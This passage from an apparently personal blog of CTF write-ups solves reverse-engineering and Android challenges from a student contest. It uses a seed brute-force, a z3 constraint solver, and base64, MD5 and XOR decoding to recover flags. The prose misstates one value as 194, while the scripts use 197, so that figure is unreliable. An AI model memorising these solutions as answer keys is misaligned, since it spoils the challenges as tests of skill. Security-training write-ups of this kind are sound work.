class="number">752</span>, <span class="number">885</span>, <span class="number">815</span>, <span class="number">1075</span>, <span class="number">1059</span>, <span class="number">1166</span>, <span class="number">1082</span>, <span class="number">1429</span>, <span class="number">1583</span>, <span class="number">1696</span>, <span class="number">1380</span>,</span><br><span class="line">     <span class="number">1987</span>, <span class="number">2263</span>, <span class="number">2128</span>, <span class="number">2277</span>, <span class="number">2387</span>, <span class="number">2670</span>, <span class="number">2692</span>, <span class="number">3255</span>, <span class="number">3116</span>, <span class="number">3306</span>, <span class="number">3132</span>, <span class="number">3659</span>, <span class="number">3139</span>, <span class="number">3422</span>, <span class="number">3600</span>, <span class="number">3584</span>, <span class="number">3343</span>, <span class="number">3546</span>,</span><br><span class="line">     <span class="number">3299</span>, <span class="number">3633</span>, <span class="number">3281</span>, <span class="number">3146</span>, <span class="number">2990</span>, <span class="number">2617</span>, <span class="number">2780</span>, <span class="number">2893</span>, <span class="number">2573</span>, <span class="number">2584</span>, <span class="number">2424</span>, <span class="number">2715</span>, <span class="number">2513</span>, <span class="number">2324</span>, <span class="number">2080</span>, <span class="number">2293</span>, <span class="number">2245</span>, <span class="number">2309</span>,</span><br><span class="line">     <span class="number">2036</span>, <span class="number">1944</span>, <span class="number">1931</span>, <span class="number">1817</span>, <span class="number">1483</span>, <span class="number">1372</span>, <span class="number">1087</span>, <span class="number">1221</span>, <span class="number">893</span>, <span class="number">785</span>, <span class="number">697</span>, <span class="number">586</span>, <span class="number">547</span>, <span class="number">324</span>, <span class="number">177</span>, <span class="number">184</span>]</span><br><span class="line">    flag = raw_input(<span class="string">'plz input your flag:'</span>)</span><br><span class="line">    length = len(flag)</span><br><span class="line">    a = struct.unpack(<span class="string">'&lt;I'</span>, flag[length - <span class="number">4</span>:].encode())[<span class="number">0</span>] &amp; <span class="number">255</span></span><br><span class="line">    b = []</span><br><span class="line">    c = fun(<span class="number">1</span>, <span class="number">255</span>, a)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        b.append(next(c))</span><br><span class="line"></span><br><span class="line">    d = [ <span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">72</span>) ]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(length):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">            a = ord(flag[i]) ^ b[j]</span><br><span class="line">            d[(i + j)] += a</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(d)):</span><br><span class="line">        <span class="keyword">if</span> d[i] != arr[i]:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'fail'</span></span><br><span class="line">            time.sleep(<span class="number">5</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'success'</span></span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><ul><li><p>关键点1: 这个fun函数就是rand函数, 其参数s即为随机数种子。</p></li><li><p>关键点2: 如何确定这个随机数种子。</p></li><li><p>关键点3: 如何确定flag的长度。</p></li><li><p>首先: d的长度为72, b的长度为32 。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191110221904.png" alt></p><ul><li><p>通过这一部分能知道, 我们最大能够访问到d[71], 而j最大取到31,所以length(flag的长度)最大取到40,所以flag的长度为41。</p></li><li><p>而且, d[0]只能由d[0+0]来访问，即i和j均为0。 d[71]只能由d[31+40]来访问到,所以需要d[0] = arr[0] = 77,d[71] = arr[71] = 184。</p></li><li><p>又因为flag的开头为<code>Syc{</code>, 开头第一个为<code>S</code>,末尾为<code>}</code>。</p></li><li><p>所以b[0] = ord(‘S’)^d[0] = 30, b[31] = ord(‘}’) ^ d[71] = 194</p></li><li><p>又因为 <code>a = struct.unpack(&#39;&lt;I&#39;, flag[length - 4:].encode())[0] &amp; 255</code>,所以随机数种子的取值为 0~255 。</p></li><li><p>然后就可以爆破这个随机数种子了。</p></li><li><p>爆破脚本如下:</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">(start, end, s)</span>:</span></span><br><span class="line">    a = <span class="number">32310901</span></span><br><span class="line">    b = <span class="number">1729</span></span><br><span class="line">    c = s</span><br><span class="line">    m = end - start</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        d = int((a * c + b) % m)</span><br><span class="line">        <span class="keyword">yield</span> d</span><br><span class="line">        c = d</span><br><span class="line"><span class="keyword">for</span> seed <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">    b = []</span><br><span class="line">    c = fun(<span class="number">1</span>, <span class="number">255</span>, seed)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        b.append(next(c))</span><br><span class="line">    <span class="keyword">if</span> b[<span class="number">0</span>] == <span class="number">30</span> <span class="keyword">and</span> b[<span class="number">31</span>] == <span class="number">197</span>:</span><br><span class="line">        <span class="keyword">print</span> seed</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><ul><li><p>得出来 seed 为 49 。b为<code>b = [30, 243, 208, 79, 68, 71, 24, 83, 90, 65, 118,219, 76, 115, 12, 17, 108, 37, 218, 7, 180, 179, 110,175, 88, 181, 248, 45, 8, 249, 114, 197]</code></p></li><li><p>然后利用z3约束求出flag。</p></li><li><p>Z3脚本如下:</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arr = [ <span class="number">77</span>,<span class="number">263</span>,<span class="number">394</span>,<span class="number">442</span>,<span class="number">463</span>,<span class="number">512</span>,<span class="number">667</span>,<span class="number">641</span>,</span><br><span class="line">        <span class="number">804</span>,<span class="number">752</span>,<span class="number">885</span>,<span class="number">815</span>,<span class="number">1075</span>,<span class="number">1059</span>,<span class="number">1166</span>,</span><br><span class="line">        <span class="number">1082</span>,<span class="number">1429</span>,<span class="number">1583</span>,<span class="number">1696</span>,<span class="number">1380</span>,<span class="number">1987</span>,</span><br><span class="line">        <span class="number">2263</span>,<span class="number">2128</span>,<span class="number">2277</span>,<span class="number">2387</span>,<span class="number">2670</span>,<span class="number">2692</span>,</span><br><span class="line">        <span class="number">3255</span>,<span class="number">3116</span>,<span class="number">3306</span>,<span class="number">3132</span>,<span class="number">3659</span>,<span class="number">3139</span>,</span><br><span class="line">        <span class="number">3422</span>,<span class="number">3600</span>,<span class="number">3584</span>,<span class="number">3343</span>,<span class="number">3546</span>,<span class="number">3299</span>,</span><br><span class="line">        <span class="number">3633</span>,<span class="number">3281</span>,<span class="number">3146</span>,<span class="number">2990</span>,<span class="number">2617</span>,<span class="number">2780</span>,</span><br><span class="line">        <span class="number">2893</span>,<span class="number">2573</span>,<span class="number">2584</span>,<span class="number">2424</span>,<span class="number">2715</span>,<span class="number">2513</span>,</span><br><span class="line">        <span class="number">2324</span>,<span class="number">2080</span>,<span class="number">2293</span>,<span class="number">2245</span>,<span class="number">2309</span>,<span class="number">2036</span>,</span><br><span class="line">        <span class="number">1944</span>,<span class="number">1931</span>,<span class="number">1817</span>,<span class="number">1483</span>,<span class="number">1372</span>,<span class="number">1087</span>,</span><br><span class="line">        <span class="number">1221</span>,<span class="number">893</span>,<span class="number">785</span>,<span class="number">697</span>,<span class="number">586</span>,<span class="number">547</span>,<span class="number">324</span>,</span><br><span class="line">        <span class="number">177</span>,<span class="number">184</span>]</span><br><span class="line"></span><br><span class="line">b = [<span class="number">30</span>, <span class="number">243</span>, <span class="number">208</span>, <span class="number">79</span>, <span class="number">68</span>, <span class="number">71</span>, <span class="number">24</span>, <span class="number">83</span>, <span class="number">90</span>, <span class="number">65</span>, <span class="number">118</span>,</span><br><span class="line">    <span class="number">219</span>, <span class="number">76</span>, <span class="number">115</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">108</span>, <span class="number">37</span>, <span class="number">218</span>, <span class="number">7</span>, <span class="number">180</span>, <span class="number">179</span>, </span><br><span class="line">     <span class="number">110</span>,<span class="number">175</span>, <span class="number">88</span>, <span class="number">181</span>, <span class="number">248</span>, <span class="number">45</span>, <span class="number">8</span>, <span class="number">249</span>, <span class="number">114</span>, <span class="number">197</span>]</span><br><span class="line"></span><br><span class="line">flag = [BitVec(<span class="string">'flag%d'</span>%i,<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">41</span>)]</span><br><span class="line"></span><br><span class="line">length = len(flag)</span><br><span class="line"></span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">41</span>):</span><br><span class="line">    solver.add(flag[i]&gt;=<span class="number">32</span>)</span><br><span class="line">    solver.add(flag[i]&lt;=<span class="number">127</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    solver.add(flag[i] == ord(<span class="string">'Syc&#123;'</span>[i]))</span><br><span class="line">solver.add(flag[length<span class="number">-1</span>] == ord(<span class="string">'&#125;'</span>))</span><br><span class="line"></span><br><span class="line">d = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">72</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(length):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        a = flag[i] ^ b[j]</span><br><span class="line">        d[i + j] += a</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(d)):</span><br><span class="line">    solver.add(simplify(d[i] == arr[i]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">    m = solver.model()</span><br><span class="line">    Flag = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">41</span>):</span><br><span class="line">        Flag += chr(eval(str(solver.model().eval(flag[i]))))</span><br><span class="line">    <span class="keyword">print</span> Flag</span><br></pre></td></tr></table></figure><ul><li>不一会就能得出flag,当然手动去逆也不是不可以。</li></ul><h2 id="0x11-Python3"><a href="#0x11-Python3" class="headerlink" title="0x11 Python3"></a>0x11 Python3</h2><h1 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h1><h2 id="0x01-Sign-in"><a href="#0x01-Sign-in" class="headerlink" title="0x01 Sign_in"></a>0x01 Sign_in</h2><ul><li>拖入JEB在主函数可以直接找到字符串<code>U3lje1NpOW5fMW5fSTNfRTRzeSF9</code>,base64解码即可得到flag。</li></ul><h2 id="0x02-蒋学姐的秘密"><a href="#0x02-蒋学姐的秘密" class="headerlink" title="0x02 蒋学姐的秘密"></a>0x02 蒋学姐的秘密</h2><ul><li>用户名可以在JEB里面找到,是<code>Syclover</code>, 密码是用户名的MD5, flag为<code>Syc{密码}</code>。</li></ul><h2 id="0x03-正在尝试重新连接"><a href="#0x03-正在尝试重新连接" class="headerlink" title="0x03 正在尝试重新连接"></a>0x03 正在尝试重新连接</h2><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191122183221.png" alt></p><ul><li>程序通过访问<code>https://0xe4s0n.github.io/download/get_data.json</code>获得一个字符串和一个data，我们访问这个链接可以知道字符串为<code>Syclover</code>,data是一个数组<code>[&quot;33&quot;,&quot;28&quot;,&quot;21&quot;,&quot;20&quot;,&quot;93&quot;,&quot;13&quot;,&quot;13&quot;,&quot;96&quot;,&quot;0&quot;,&quot;11&quot;,&quot;66&quot;,&quot;27&quot;,&quot;51&quot;,&quot;42&quot;,&quot;10&quot;,&quot;12&quot;,&quot;1&quot;,&quot;85&quot;,&quot;41&quot;,&quot;38&quot;,&quot;34&quot;,&quot;23&quot;,&quot;60&quot;,&quot;33&quot;,&quot;23&quot;,&quot;86&quot;,&quot;2&quot;,&quot;94&quot;,&quot;2&quot;,&quot;90&quot;,&quot;4&quot;]</code></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191122183403.png" alt></p><ul><li>程序有一个check方法,但是是在native层的, 所以我们分析<code>native-lib.so</code>。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191122191218.png" alt></p><ul><li>WP里面的F5解密是这样的…而我的F5界面是这样的…一些关键信息都没法正常显示。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191122191335.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/aaaaa.jpg" alt></p><ul><li>向出题人请教了一下以后得知,需要对a1进行类型转换。</li><li>点一下a1 然后按Y,输出<code>JNIEnv *</code>,然后就very nice了。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191122192519.png" alt></p><ul><li>稍作修改以后</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191122193445.png" alt></p><ul><li><p>逻辑挺简单, 将input与str[i%str__len]异或(其中str已经完成逆序,变成了<code>revolcyS</code>),如果结果与数组相同,则返回1,否则返回0。</p></li><li><p>直接逆回去得到解密脚本:</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line">s = <span class="string">'Syclover'</span>[::<span class="number">-1</span>]</span><br><span class="line">data = [<span class="string">"33"</span>,<span class="string">"28"</span>,<span class="string">"21"</span>,<span class="string">"20"</span>,<span class="string">"93"</span>,<span class="string">"13"</span>,<span class="string">"13"</span>,<span class="string">"96"</span>,<span class="string">"0"</span>,<span class="string">"11"</span>,<span class="string">"66"</span>,<span class="string">"27"</span>,<span class="string">"51"</span>,<span class="string">"42"</span>,<span class="string">"10"</span>,<span class="string">"12"</span>,<span class="string">"1"</span>,<span class="string">"85"</span>,<span class="string">"41"</span>,<span class="string">"38"</span>,<span class="string">"34"</span>,<span class="string">"23"</span>,<span class="string">"60"</span>,<span class="string">"33"</span>,<span class="string">"23"</span>,<span class="string">"86"</span>,<span class="string">"2"</span>,<span class="string">"94"</span>,<span class="string">"2"</span>,<span class="string">"90"</span>,<span class="string">"4"</span>]</span><br><span class="line">input = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(data)):</span><br><span class="line">    input+= chr(int(data[i]) ^ ord(s[i%len(s)]))</span><br><span class="line"><span class="keyword">print</span> input</span><br></pre></td></tr></table></figure><ul><li>运行即可得到flag。</li></ul><h1 id="Coding"><a href="#Coding" class="headerlink" title="Coding"></a>Coding</h1></div><div><div><div style="text-align:center;color:#ccc;font-size:14px">-------------至此本文结束<i class="fa fa-tree"></i>感谢您的阅读-------------</div></div></div><div><div id="reward-container"><div>如果觉得这篇文章对您有用，请随意打赏。 (๑•⌄•๑) 您的支持将鼓励我继续创作！</div><button id="reward-button" disable="enable" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">打赏</button><div id="qr" style="display:none"><div style="display:inline-block"><img src="/images/Wechat_SKM.png" alt="LiuLian 微信支付"><p>微信支付</p></div><div style="display:inline-block"><img src="/images/ZFB_SKM.png" alt="LiuLian 支付宝"><p>支付宝</p></div></div></div></div><div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者： </strong>LiuLian</li><li class="post-copyright-link"><strong>本文链接：</strong> <a href="http://liul14n.top/2019/10/31/Syc-Geek-10th/" title="Syc Geek 10th">http://liul14n.top/2019/10/31/Syc-Geek-10th/</a></li><li class="post-copyright-license"><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div><footer class="post-footer"><div class="post-nav"><div class="post-nav-next post-nav-item"><a href="/2019/09/28/一道逆向题引起的一系列爆破尝试/" rel="next" title="一道逆向题引起的一系列爆破尝试"><i class="fa fa-chevron-left"></i> 一道逆向题引起的一系列爆破尝试</a></div><span class="post-nav-divider"></span><div class="post-nav-prev post-nav-item"><a href="/2019/11/04/Sdnisc-2019/" rel="prev" title="Sdnisc-2019">Sdnisc-2019 <i class="fa fa-chevron-right"></i></a></div></div></footer></div></article></div></div></div><div class="sidebar-toggle"><div class="sidebar-toggle-line-wrap"><span class="sidebar-toggle-line sidebar-toggle-line-first"></span> <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span> <span class="sidebar-toggle-line sidebar-toggle-line-last"></span></div></div><aside id="sidebar" class="sidebar"><div class="sidebar-inner"><ul class="sidebar-nav motion-element"><li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">文章目录</li><li class="sidebar-nav-overview" data-target="site-overview-wrap">站点概览</li></ul><div class="site-overview-wrap sidebar-panel"><div class="site-overview"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="site-author-image" itemprop="image" src="/images/touxiang.jpeg" alt="LiuLian"><p class="site-author-name" itemprop="name">LiuLian</p><div class="site-description motion-element" itemprop="description">Salute The Time</div></div><nav class="site-state motion-element"><div class="site-state-item site-state-posts"><a href="/archives/"><span class="site-state-item-count">58</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"><a href="/categories/"><span class="site-state-item-count">8</span> <span class="site-state-item-name">分类</span></a></div></nav><div class="links-of-author motion-element"><span class="links-of-author-item"><a href="https://github.com/LiuL14n" title="GitHub &rarr; https://github.com/LiuL14n" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a> </span><span class="links-of-author-item"><a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=aFlZWl1aWVxcWVEoGRlGCwcF" title="E-Mail &rarr; http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=aFlZWl1aWVxcWVEoGRlGCwcF" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a> </span><span class="links-of-author-item"><a href="http://wpa.qq.com/msgrd?v=3&uin=1125214419&site=qq&menu=yes" title="QQ &rarr; http://wpa.qq.com/msgrd?v=3&uin=1125214419&site=qq&menu=yes" rel="noopener" target="_blank"><i class="fa fa-fw fa-qq"></i>QQ</a></span></div><div class="links-of-blogroll motion-element links-of-blogroll-block"><div class="links-of-blogroll-title"><i class="fa fa-fw fa-link"></i> From 大佬 import&nbsp; <i class="fa fa-fw fa-link"></i></div><ul class="links-of-blogroll-list"><li class="links-of-blogroll-item"><a href="https://suxinghe39.github.io/" title="SuXingHe" target="_blank">SuXingHe</a></li><li class="links-of-blogroll-item"><a href="https://hal900000.github.io" title="Hal90000" target="_blank">Hal90000</a></li><li class="links-of-blogroll-item"><a href="http://n4tsu.top/" title="Natsu" target="_blank">Natsu</a></li><li class="links-of-blogroll-item"><a href="https://dililidala.github.io" title="Ohrxw" target="_blank">Ohrxw</a></li><li class="links-of-blogroll-item"><a href="http://www.wendev.site" title="JiangWen" target="_blank">JiangWen</a></li><li class="links-of-blogroll-item"><a href="https://l0ne1y.xyz/" title="L0ne1y" target="_blank">L0ne1y</a></li></ul><div id="days"></div><script>function show_date_time(){window.setTimeout("show_date_time()",1e3),BirthDay=new Date("04/25/2019 21:13:14"),today=new Date,timeold=today.getTime()-BirthDay.getTime(),sectimeold=timeold/1e3,secondsold=Math.floor(sectimeold),msPerDay=864e5,e_daysold=timeold/msPerDay,daysold=Math.floor(e_daysold),e_hrsold=24*(e_daysold-daysold),hrsold=setzero(Math.floor(e_hrsold)),e_minsold=60*(e_hrsold-hrsold),minsold=setzero(Math.floor(60*(e_hrsold-hrsold))),seconds=setzero(Math.floor(60*(e_minsold-minsold))),document.getElementById("days").innerHTML="已运行 "+daysold+" 天 "+hrsold+" 小时 "+minsold+" 分 "+seconds+" 秒"}function setzero(e){return e<10&&(e="0"+e),e}show_date_time()</script></div></div></div><div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active"><div class="post-toc"><div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number">2.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-打比赛前先撸一只猫"><span class="nav-number">2.1.</span> <span class="nav-text">0x01 打比赛前先撸一只猫</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-number">3.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-签到"><span class="nav-number">3.1.</span> <span class="nav-text">0x01 签到</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-我好兴奋啊"><span class="nav-number">3.2.</span> <span class="nav-text">0x02 我好兴奋啊</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-翻过这座山"><span class="nav-number">3.3.</span> <span class="nav-text">0x03 翻过这座山</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-散打黑客的压缩包"><span class="nav-number">3.4.</span> <span class="nav-text">0x04 散打黑客的压缩包</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-是谁杀了谁"><span class="nav-number">3.5.</span> <span class="nav-text">0x05 是谁杀了谁</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-嘿-你喜欢吃鲱鱼罐头么"><span class="nav-number">3.6.</span> <span class="nav-text">0x06 嘿,你喜欢吃鲱鱼罐头么?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-我也想成为r1ngs"><span class="nav-number">3.7.</span> <span class="nav-text">0x07 我也想成为r1ngs</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-早点睡"><span class="nav-number">3.8.</span> <span class="nav-text">0x08 早点睡</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09-RPG真是太好玩了吧"><span class="nav-number">3.9.</span> <span class="nav-text">0x09 RPG真是太好玩了吧</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x10-I-wanna-be-a-geek"><span class="nav-number">3.10.</span> <span class="nav-text">0x10 I wanna be a geek</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x11-游戏玩累了-不如来听听歌吧"><span class="nav-number">3.11.</span> <span class="nav-text">0x11 游戏玩累了 不如来听听歌吧</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x12-马里奥真是太有趣了"><span class="nav-number">3.12.</span> <span class="nav-text">0x12 马里奥真是太有趣了</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x13-The-final"><span class="nav-number">3.13.</span> <span class="nav-text">0x13 The final</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PWN"><span class="nav-number">4.</span> <span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-Find-tools"><span class="nav-number">4.1.</span> <span class="nav-text">0x01 Find tools</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-BabyROP"><span class="nav-number">4.2.</span> <span class="nav-text">0x02 BabyROP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-Babyshellcode"><span class="nav-number">4.3.</span> <span class="nav-text">0x03 Babyshellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-EasyCanary"><span class="nav-number">4.4.</span> <span class="nav-text">0x04 EasyCanary</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-BabyCanary"><span class="nav-number">4.5.</span> <span class="nav-text">0x05 BabyCanary</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-not-bad"><span class="nav-number">4.6.</span> <span class="nav-text">0x06 not bad</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#RE"><span class="nav-number">5.</span> <span class="nav-text">RE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-Jiang’s-fan"><span class="nav-number">5.1.</span> <span class="nav-text">0x01 Jiang’s fan</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-secret"><span class="nav-number">5.2.</span> <span class="nav-text">0x02 secret</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-Easy-VB"><span class="nav-number">5.3.</span> <span class="nav-text">0x03 Easy VB</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-冰菓"><span class="nav-number">5.4.</span> <span class="nav-text">0x04 冰菓</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-PYC是啥子嘛"><span class="nav-number">5.5.</span> <span class="nav-text">0x05 PYC是啥子嘛</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-Dll-Reverse"><span class="nav-number">5.6.</span> <span class="nav-text">0x06 Dll Reverse</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-Win32-Program"><span class="nav-number">5.7.</span> <span class="nav-text">0x07 Win32 Program</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-阅兵你认真看了么"><span class="nav-number">5.8.</span> <span class="nav-text">0x08 阅兵你认真看了么</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09-Python1"><span class="nav-number">5.9.</span> <span class="nav-text">0x09 Python1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x10-Python2"><span class="nav-number">5.10.</span> <span class="nav-text">0x10 Python2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x11-Python3"><span class="nav-number">5.11.</span> <span class="nav-text">0x11 Python3</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Android"><span class="nav-number">6.</span> <span class="nav-text">Android</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-Sign-in"><span class="nav-number">6.1.</span> <span class="nav-text">0x01 Sign_in</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-蒋学姐的秘密"><span class="nav-number">6.2.</span> <span class="nav-text">0x02 蒋学姐的秘密</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-正在尝试重新连接"><span class="nav-number">6.3.</span> <span class="nav-text">0x03 正在尝试重新连接</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Coding"><span class="nav-number">7.</span> <span class="nav-text">Coding</span></a></li></ol></div></div></div><div class="back-to-top"><i class="fa fa-arrow-up"></i> <span id="scrollpercent"><span>0</span>%</span></div></div></aside></div></main><footer id="footer" class="footer"><div class="footer-inner"><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="copyright">&copy; 2019 – <span itemprop="copyrightYear">2022</span> <span class="with-love" id="animate"><i class="fa fa-star"></i> </span><span class="author" itemprop="copyrightHolder">LiuLian</span></div><div class="powered-by"><i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv"> 本站访客数:<span id="busuanzi_value_site_pv"></span></span></div><div class="busuanzi-count"><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span class="post-meta-item-icon"><i class="fa fa-user"></i> </span><span class="site-uv" title="总访客量"><span class="busuanzi-value" id="busuanzi_value_site_uv"></span> </span><span class="post-meta-divider">|</span> <span 